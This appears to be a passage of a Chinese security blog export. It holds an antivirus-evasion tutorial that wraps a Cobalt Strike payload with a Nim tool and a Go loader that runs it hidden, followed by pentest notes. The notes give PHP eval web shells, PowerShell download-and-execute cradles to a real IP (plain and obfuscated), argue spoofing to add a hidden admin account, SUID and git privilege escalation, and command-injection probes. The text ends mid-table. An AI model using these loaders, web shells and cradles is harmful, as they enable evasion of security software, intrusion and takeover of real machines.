AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>免杀和去黑窗</title>
      <link href="2022/01/18/%E5%85%8D%E6%9D%80%E5%92%8C%E5%8E%BB%E9%BB%91%E7%AA%97/"/>
      <url>2022/01/18/%E5%85%8D%E6%9D%80%E5%92%8C%E5%8E%BB%E9%BB%91%E7%AA%97/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>测试日期：2022.01.18</p><p>效果：免杀360套装</p><p>项目BypassAv-web：<a href="https://github.com/M-Kings/BypassAv-web.git">https://github.com/M-Kings/BypassAv-web.git</a></p><p>现在项目貌似已经不全了，当初2021.11.13第一次测试的时候有如下文件，winim-master是后来下载的环境，其他应该是项目自带的。</p><p><img src="/../../../../images/%E5%85%8D%E6%9D%80%E5%92%8C%E5%8E%BB%E9%BB%91%E7%AA%97/image-20220118153750369.png" alt="image-20220118153750369"></p><p>环境要求：python3和nim</p><p>在kali上搭建测试环境，自带了python3，所以仅安装nim就够了</p><h2 id="Nim安装"><a href="#Nim安装" class="headerlink" title="Nim安装"></a>Nim安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt install nim&#x2F;&#x2F;nim安装</span><br><span class="line">apt install mingw-w64&#x2F;&#x2F;如果要编译出Windows下可以运行的exe和dll文件，那么必须安装mingw</span><br><span class="line">wget https:&#x2F;&#x2F;codeload.github.com&#x2F;khchen&#x2F;winim&#x2F;zip&#x2F;refs&#x2F;heads&#x2F;master  &#x2F;&#x2F;安装nim的依赖库</span><br><span class="line">unzip master</span><br><span class="line">cd winim-master&#x2F;</span><br><span class="line">nimble install</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/%E5%85%8D%E6%9D%80%E5%92%8C%E5%8E%BB%E9%BB%91%E7%AA%97/image-20220118154434367.png" alt="image-20220118154434367"></p><h2 id="免杀制作"><a href="#免杀制作" class="headerlink" title="免杀制作"></a>免杀制作</h2><p>cs上生成payload.bin，上传到kali</p><p><img src="/../../../../images/%E5%85%8D%E6%9D%80%E5%92%8C%E5%8E%BB%E9%BB%91%E7%AA%97/image-20220118154542478.png" alt="image-20220118154542478"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 NimPassav.py -r payload.bin -t 64</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/%E5%85%8D%E6%9D%80%E5%92%8C%E5%8E%BB%E9%BB%91%E7%AA%97/image-20220118154946998.png" alt="image-20220118154946998"></p><p>到了这一步生成的马虽然能免杀360，但是执行会持续有个黑窗，关掉后就会丢失会话</p><h2 id="去黑窗"><a href="#去黑窗" class="headerlink" title="去黑窗"></a>去黑窗</h2><p>用RECalcTool.exe把上面exe转成base64字符</p><p><img src="/../../../../images/%E5%85%8D%E6%9D%80%E5%92%8C%E5%8E%BB%E9%BB%91%E7%AA%97/image-20220118155324837.png" alt="image-20220118155324837"></p><p>把字符串放入下面fileString的字符串中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">&quot;bytes&quot;</span><br><span class="line">&quot;compress&#x2F;zlib&quot;</span><br><span class="line">&quot;encoding&#x2F;base64&quot;</span><br><span class="line">&#x2F;&#x2F; &quot;fmt&quot;</span><br><span class="line">&quot;io&quot;</span><br><span class="line">&quot;io&#x2F;ioutil&quot;</span><br><span class="line">&quot;os&quot;</span><br><span class="line">&quot;syscall&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;fileString值替换为passav处理后的exe文件的base64字符串</span><br><span class="line">var fileString &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">var sI syscall.StartupInfo</span><br><span class="line">var pI syscall.ProcessInformation</span><br><span class="line">var tempFile &#x3D; os.TempDir() + &quot;&#x2F;temp.exe&quot;</span><br><span class="line">exe, _ :&#x3D; base64.StdEncoding.DecodeString(fileString)</span><br><span class="line">&#x2F;&#x2F;exe2 :&#x3D; doZlibUnCompress(exe)</span><br><span class="line">ioutil.WriteFile(tempFile, exe, 0666)</span><br><span class="line">argv :&#x3D; syscall.StringToUTF16Ptr(tempFile)</span><br><span class="line">_ &#x3D; syscall.CreateProcess(nil, argv, nil, nil, true, 0x08000000, nil, nil, &amp;sI, &amp;pI)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;进行zlib解压缩</span><br><span class="line">func doZlibUnCompress(compressSrc []byte) []byte &#123;</span><br><span class="line">b :&#x3D; bytes.NewReader(compressSrc)</span><br><span class="line">var out bytes.Buffer</span><br><span class="line">r, _ :&#x3D; zlib.NewReader(b)</span><br><span class="line">io.Copy(&amp;out, r)</span><br><span class="line">return out.Bytes()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;进行zlib压缩</span><br><span class="line">func doZlibCompress(src []byte) []byte &#123;</span><br><span class="line">var in bytes.Buffer</span><br><span class="line">w :&#x3D; zlib.NewWriter(&amp;in)</span><br><span class="line">w.Write(src)</span><br><span class="line">w.Close()</span><br><span class="line">return in.Bytes()</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../../../../images/%E5%85%8D%E6%9D%80%E5%92%8C%E5%8E%BB%E9%BB%91%E7%AA%97/image-20220118155522794.png" alt="image-20220118155522794"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go build  -ldflags &quot;-w -s&quot; proc.go &#x2F;&#x2F;要求go环境，生成proc.exe</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/%E5%85%8D%E6%9D%80%E5%92%8C%E5%8E%BB%E9%BB%91%E7%AA%97/image-20220118160011899.png" alt="image-20220118160011899"></p><p>这里是直接在机器上双击执行的，360没反应，但是通过冰蝎这类执行，360还是会提示</p><h2 id="换md5"><a href="#换md5" class="headerlink" title="换md5"></a>换md5</h2><p>之前一次演练后就开始被360杀了，奇怪的是这次重新写文章的时候发现360又没杀了，当时被360杀修改文件md5就又可以了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy &#x2F;b proc.exe+1.txt cc.exe  &#x2F;&#x2F;1.txt内容随意，cc.exe为重新生成的，仍然可以重新上线</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/%E5%85%8D%E6%9D%80%E5%92%8C%E5%8E%BB%E9%BB%91%E7%AA%97/image-20220118161745064.png" alt="image-20220118161745064"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 免杀测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>杂记</title>
      <link href="2022/01/18/%E6%9D%82%E8%AE%B0/"/>
      <url>2022/01/18/%E6%9D%82%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a>searchsploit</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit app version</span><br></pre></td></tr></table></figure><p>kali上用于搜索漏洞的命令，后面可以直接跟框架、协议、系统及版本等来搜索相应的漏洞，如【searchsploit thinkphp/smb/ubuntu 16.04】</p><h2 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h2><p>SUID是Linux的一种权限机制，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。如果拥有SUID权限，那么就可以利用系统中的二进制文件和工具来进行root提权。</p><p>已知的可用来提权的linux可行性的文件列表如下：</p><ul><li>Nmap</li><li>Vim</li><li>find</li><li>Bash</li><li>More</li><li>Less</li><li>Nano</li><li>cp</li></ul><p>以下命令可以发现系统上运行的所有SUID可执行文件。具体来说，命令将尝试查找具有root权限的SUID的文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure><p>例如如果Find命令也是以Suid权限运行的话，则将通过find执行的所有命令都会以root权限执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch pentestlab</span><br><span class="line">find pentestlab -exec whoami \;</span><br></pre></td></tr></table></figure><h2 id="nmap部分参数"><a href="#nmap部分参数" class="headerlink" title="nmap部分参数"></a>nmap部分参数</h2><p> -sn：#ping探测扫描主机， 不进行端口扫描 ，当对方打开防火墙无法ping通时，就发现不了该存活主机。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.5.0&#x2F;24</span><br></pre></td></tr></table></figure><p>-sP:通过arp包来确认主机是否存活，即使无法ping通，也能确认存活。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.5.0&#x2F;24</span><br></pre></td></tr></table></figure><p>nmap端口扫描</p><p>-sS:</p><p>使用频率最高的扫描选项：SYN扫描，又称为半开放扫描，它不打开一个完全的TCP连接，执行得很快，效率高<br>（一个完整的tcp连接需要3次握手，而-sS选项不需要3次握手）<br>Tcp SYN Scan (sS) 它被称为半开放扫描<br>优点：Nmap发送SYN包到远程主机，但是它不会产生任何会话，目标主机几乎不会把连接记入系统日志。（防止对方判断为扫描攻击），扫描速度快，效率高，在工作中使用频率最高<br>缺点：它需要root/administrator权限执行</p><p>-Pn:默认目标存活，当确认目标存活但无法ping通可以使用</p><p>-A：获取版本等详细信息</p><p>-p-    ：扫描0-65535端口</p><h2 id="echo命令写马"><a href="#echo命令写马" class="headerlink" title="echo命令写马"></a>echo命令写马</h2><p>windows：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo ^&lt;?php @eval($_POST[cmd]);?^&gt; &gt; .&#x2F;iii.txt</span><br></pre></td></tr></table></figure><p>linux：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&lt;?php @eval(\$_POST[&#39;cmd&#39;]); ?&gt;&quot; &gt; .&#x2F;1.php</span><br></pre></td></tr></table></figure><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>wpscan    kali上用于渗透wordpress的工具，支持爆破账密和漏洞扫描等</p><p>joomscan    kali上用于渗透joomla的工具，可扫描出版本、后台等信息</p><p>rbash：受限制的shell，部分命令无法执行，linux的一种安全措施。对应的技术为rbash逃逸，指拜托限制，类似于越权。</p><p>比如dc2靶机使用环境变量来进行rbash逃逸。</p><h2 id="git提权"><a href="#git提权" class="headerlink" title="git提权"></a>git提权</h2><p>原理是git存在缓冲区溢出漏洞，在使用下面两种方法时，不需要输入root密码即可以root权限执行这条命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">两种方法</span><br><span class="line">1、sudo git help config</span><br><span class="line">在末行命令模式输入  !&#x2F;bin&#x2F;bash 或 !&#39;sh&#39; 完成提权</span><br><span class="line">2、sudo git -p help</span><br><span class="line">      !&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><h2 id="john"><a href="#john" class="headerlink" title="john"></a>john</h2><p>john the ripper：简称john，密码破解器，可以直接把hash值保存在文件中，使用命令【john 哈希文件】进行破解，如遇提示<strong>No password hashes loaded</strong>需重新编译【make clean linux-x86-64】</p><h2 id="判断站库分离"><a href="#判断站库分离" class="headerlink" title="判断站库分离"></a>判断站库分离</h2><p>mssql数据库是否站库分离：</p><p>假设a是数据库服务器，b是对应的网站服务器，如果b网站存在mssql注入。</p><p>【select @@servername;】返回数据库服务器计算机名称</p><p>【select host_name();】返回网站服务器计算机名称</p><p>如果不一样就是站库分离</p><p>当站库分离时，通过–os-shell获得的shell是数据库服务器上的shell，而非网站服务器上的shell</p><h2 id="windows系统上查找网站路径"><a href="#windows系统上查找网站路径" class="headerlink" title="windows系统上查找网站路径"></a>windows系统上查找网站路径</h2><p>【dir /s /b c:\test.txt】即查找c盘下含有test.txt文件的路径，不支持模糊查询</p><p>/s      显示指定目录和所有子目录中的文件。</p><p>/b    使用空格式(没有标题信息或摘要)。</p><p>要查找网站路径可以在网站上找到一个特殊的文件名，然后在几个盘符依次执行命令尝试。</p><p><img src="/../../../../images/%E6%9D%82%E8%AE%B0/image-20201227223931206.png" alt="image-20201227223931206"></p><h2 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h2><p>powershell在win7和winserver2008后才有</p><p>PowerShell的默认配置是不允许执行脚本文件的，具有保护策略，网上有多种绕过方式。</p><p><img src="/../../../../images/%E6%9D%82%E8%AE%B0/image-20201228154827601.png" alt="image-20201228154827601"></p><p>比如【powershell.exe -ExecutionPolicy Bypass -File .\payload.ps1】就可以绕过执行</p><p>或者powershell中【set-ExecutionPolicy RemoteSigned】选y后也可以执行</p><p><img src="/../../../../images/%E6%9D%82%E8%AE%B0/image-20201228155017753.png" alt="image-20201228155017753"></p><p>下面介绍使用powershell进行cs上线，cs上生成ps1脚本，然后上传到web服务器上保证可以访问到，再执行命令</p><p>【powershell.exe -nop -w hidden -c “IEX ((new-object net.webclient).downloadstring(‘<a href="http://47.52.31.161:8080/ps1&#39;))&quot;%E3%80%91">http://47.52.31.161:8080/ps1&#39;))&quot;】</a></p><p><img src="/../../../../images/%E6%9D%82%E8%AE%B0/image-20201228155246095.png" alt="image-20201228155246095"></p><p><img src="/../../../../images/%E6%9D%82%E8%AE%B0/image-20201228155411605.png" alt="image-20201228155411605"></p><p>调用powershell不产生警告。可以通过Invoke-Obfuscation编码静态免杀，杀软检测不会警告，但是上线会被杀软发现阻止，生成的dll文件被发现。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell set-alias -name kaspersky -value Invoke-Expression;&quot;$a1&#x3D;&#39;kaspersky ((new-object net.webclient).downl&#39;;$a2&#x3D;&#39;oadstring(&#39;&#39;http:&#x2F;&#x2F;47.52.31.161:8080&#x2F;sh1&#39;&#39;))&#39;;$a3&#x3D;$a1，$a2;kaspersky(-join $a3)&quot;</span><br></pre></td></tr></table></figure><h2 id="cs上argue参数绕过杀软"><a href="#cs上argue参数绕过杀软" class="headerlink" title="cs上argue参数绕过杀软"></a>cs上argue参数绕过杀软</h2><p>直接使用命令添加用户会被杀软拦截<img src="/../../../../images/%E6%9D%82%E8%AE%B0/image-20201229160026533.png" alt="image-20201229160026533"></p><p>可以使用argue绕过杀软添加用户【<strong>使用前提</strong>：administrator 或 system权限。】</p><p>第一行是进行参数污染，第二行是查看被污染的参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">argue net1 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">argue</span><br><span class="line">execute net1 user hack Root111! &#x2F;add</span><br><span class="line">execute net1 localgroup administrators hack &#x2F;add</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/%E6%9D%82%E8%AE%B0/image-20201229160329704.png" alt="image-20201229160329704"></p><p>污染powershell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">argue powershell.exe xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br></pre></td></tr></table></figure><p>再用execute执行powershell上线cs命令</p><p><img src="/../../../../images/%E6%9D%82%E8%AE%B0/image-20201229161259258.png" alt="image-20201229161259258"></p><h2 id="确定文件上传是白名单还是黑名单"><a href="#确定文件上传是白名单还是黑名单" class="headerlink" title="确定文件上传是白名单还是黑名单"></a>确定文件上传是白名单还是黑名单</h2><p>上传一个不存在的文件格式后缀名，如果不允许上传，就是白名单。如果允许上传，就是黑名单。</p><h2 id="查看机器杀软"><a href="#查看机器杀软" class="headerlink" title="查看机器杀软"></a>查看机器杀软</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic &#x2F;namespace:\\root\securitycenter2 path antivirusproduct GET displayName，productState， pathToSignedProductExe</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/%E6%9D%82%E8%AE%B0/image-20201231094636166.png" alt="image-20201231094636166"></p><h2 id="确认是虚拟机还是物理机"><a href="#确认是虚拟机还是物理机" class="headerlink" title="确认是虚拟机还是物理机"></a>确认是虚拟机还是物理机</h2><p>linux</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dmidecode -s system-product-name</span><br></pre></td></tr></table></figure><p>kali虚拟机</p><p><img src="/../../../../images/%E6%9D%82%E8%AE%B0/image-20201231095338168.png" alt="image-20201231095338168"></p><p>阿里云服务器</p><p><img src="/../../../../images/%E6%9D%82%E8%AE%B0/image-20201231095405841.png" alt="image-20201231095405841"></p><p>windows</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><p>虚拟机</p><p><img src="/../../../../images/%E6%9D%82%E8%AE%B0/image-20201231095656161.png" alt="image-20201231095656161"></p><p>物理机</p><p><img src="/../../../../images/%E6%9D%82%E8%AE%B0/image-20201231095737090.png" alt="image-20201231095737090"></p><h2 id="命令执行和反弹shell"><a href="#命令执行和反弹shell" class="headerlink" title="命令执行和反弹shell"></a>命令执行和反弹shell</h2><p>思路：比如在某些业务系统设置ip地址的地方后面跟上<kbd>|</kbd>或<kbd>||</kbd>，后面再跟上下面的测试命令，猜测可能会ping IP。</p><p>或者构建上传压缩包的文件名为这个，猜测系统使用解压命令，然后参数是文件名，文件名后跟上其他的命令，以此测试命令执行漏洞。</p><p>windows</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping %OS%.wwgjp6.dnslog.cn</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/%E6%9D%82%E8%AE%B0/image-20210313183346415.png" alt="image-20210313183346415"></p><p>关于%OS%</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;变量                     类型       描述</span><br><span class="line">&#x2F;&#x2F;%ALLUSERSPROFILE%        本地       返回“所有用户”配置文件的位置。</span><br><span class="line">&#x2F;&#x2F;%APPDATA%                本地       返回默认情况下应用程序存储数据的位置。</span><br><span class="line">&#x2F;&#x2F;%CD%                     本地       返回当前目录字符串。</span><br><span class="line">&#x2F;&#x2F;%CMDCMDLINE%             本地       返回用来启动当前的 Cmd.exe 的准确命令行。</span><br><span class="line">&#x2F;&#x2F;%CMDEXTVERSION%          系统       返回当前的“命令处理程序扩展”的版本号。</span><br><span class="line">&#x2F;&#x2F;%COMPUTERNAME%           系统       返回计算机的名称。</span><br><span class="line">&#x2F;&#x2F;%COMSPEC%                系统       返回命令行解释器可执行程序的准确路径。</span><br><span class="line">&#x2F;&#x2F;%DATE%                   系统       返回当前日期。使用与 date &#x2F;t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。</span><br><span class="line">&#x2F;&#x2F;%ERRORLEVEL%             系统       返回上一条命令的错误代码。通常用非零值表示错误。</span><br><span class="line">&#x2F;&#x2F;%HOMEDRIVE%              系统       返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</span><br><span class="line">&#x2F;&#x2F;%HOMEPATH%               系统       返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</span><br><span 